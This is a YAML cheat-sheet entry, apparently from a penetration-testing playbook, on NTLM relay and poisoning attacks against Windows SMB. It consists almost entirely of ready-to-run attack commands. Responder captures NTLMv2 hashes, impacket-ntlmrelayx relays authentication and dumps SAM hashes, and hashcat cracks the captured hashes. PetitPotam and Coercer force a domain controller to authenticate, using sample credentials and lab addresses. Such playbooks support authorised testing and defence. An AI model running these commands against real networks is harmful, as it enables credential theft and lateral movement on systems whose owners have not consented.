---
description: |
  NTLM relay and poisoning attacks — capture NTLMv2 hashes via Responder, relay authentication to other hosts, and coerce authentication from targets.
commands:
  - have: No_Creds
    cmd: |
      # Capture NTLMv2 hashes
      sudo responder -I eth0

      # Relay (requires SMB signing disabled: nxc smb 10.10.10.27 --gen-relay-list relay.txt)
      impacket-ntlmrelayx -tf targets.txt -smb2support
      impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam

      # Crack captured hashes
      hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
  - have: Credentials
    cmd: |
      # PetitPotam — coerce NTLM auth from DC (authenticated)
      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27

      # Coercer — automated authentication coercion
      python3 Coercer.py coerce -u sec_user -p 'P@ssw0rd' -d senshu.sh -l 10.10.10.21 -t 10.10.10.27
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
techniques:
  - NTLM_Relay
references:
  - https://github.com/lgandx/Responder
  - https://github.com/fortra/impacket
  - https://github.com/topotam/PetitPotam
  - https://github.com/p0dalirius/Coercer
---
